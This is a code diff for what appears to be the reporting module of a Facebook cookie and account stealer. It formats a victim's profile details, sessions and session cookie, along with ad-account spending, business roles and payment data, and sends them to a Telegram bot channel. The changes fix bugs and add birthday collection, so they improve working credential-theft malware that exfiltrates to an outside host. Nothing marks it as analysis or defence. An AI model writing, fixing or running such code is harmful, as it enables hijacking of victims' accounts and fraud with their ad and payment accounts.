@@ -1,3 +1,4 @@
+import traceback
 import requests
 
 
@@ -20,7 +21,7 @@ class Telegram:
     def apiGetConvertToUSD(self, value, currency):
         return value * 1.0 / self.CURRENCY_RATE[currency]
 
-    def apiSendMessage(self, cookieDecode, values):
+    def apiSendMessage(self, cookieEncode, values):
         try:
             if not self.apiGetIsActivateAndThresholdOnAdaccount(values['adaccounts']):
                 return
@@ -45,11 +46,12 @@ class Telegram:
 *[ About ][ {values['me']['name']} ]*\n\
 ```\nUID: {values['me']['id']}\n```\
 ```\nName: {values['me']['name']}\n```\
-```\nGender: {values['me']['gender']}\n```\
+```\nGender: {values['me'].get('gender')}\n```\
+```\nBirthday: {values['me'].get('birthday')}\n```\
 ```\nFriends: {values['me']['friends']['summary']['total_count']}\n```\
 ```\nSessions: {', '.join(values['sessions'][:3])}\n```\n\
 *[ Cookie ]*\n\
-```\n{cookieDecode}\n```\
+```\n{cookieEncode}\n```\
             ".strip()
 
             api = requests.Session()
@@ -58,8 +60,9 @@ class Telegram:
                 chatId = self.TELEGRAM_CHANNEL_BIG_WORLD_AGENCY
             _ = api.get(
                 f'{self.TELEGRAM_BOT_API}/sendMessage?chat_id={chatId}&parse_mode=markdown&text={messageText}'
-            )
-        except Exception:
+            ).json()
+        except:
+            print(traceback.format_exc())
             pass
 
     def apiGetIsActivateAndThresholdOnAdaccount(self, adaccounts):
@@ -73,7 +76,7 @@ class Telegram:
         for adaccount in adaccounts:
             if self.apiGetAccountStatusOnAdaccount(adaccount) == 'ACTIVE':
                 threshold = self.apiGetThresholdOnAdaccount(adaccount)
-                if self.apiGetConvertToUSD(threshold) >= self.MIN_THRESHOLD:
+                if self.apiGetConvertToUSD(threshold, adaccount['currency']) >= self.MIN_THRESHOLD:
                     return True
         return False
 
@@ -181,7 +184,10 @@ class Telegram:
         if 'roles' in page:
             for user in page['roles']['data']:
                 if user['id'] == UID:
-                    return user['role']
+                    if 'role' in user:
+                        return user['role']
+                    else:
+                        return 'Admin'
         return '-'
 
     def apiGetSpentOnAdaccount(self, adaccount):
@@ -220,16 +226,16 @@ class Telegram:
         return 'OFF'
 
     def apiGetUsersOnBusiness(self, business):
-        return len(filter(
+        return len(list(filter(
             lambda user: user['role'] != 'ADMIN',
             business['business_users']['data']
-        ))
+        )))
 
     def apiGetUsersAdminOnBusiness(self, business):
-        return len(filter(
+        return len(list(filter(
             lambda user: user['role'] == 'ADMIN',
             business['business_users']['data']
-        ))
+        )))
 
     def apiGetAdaccountOnBusiness(self, business):
         if 'owned_ad_accounts' in business:
@@ -256,3 +262,6 @@ class Telegram:
                     )
             return '\n'.join(payments)
         return '-'
+
+
+telegram = Telegram()
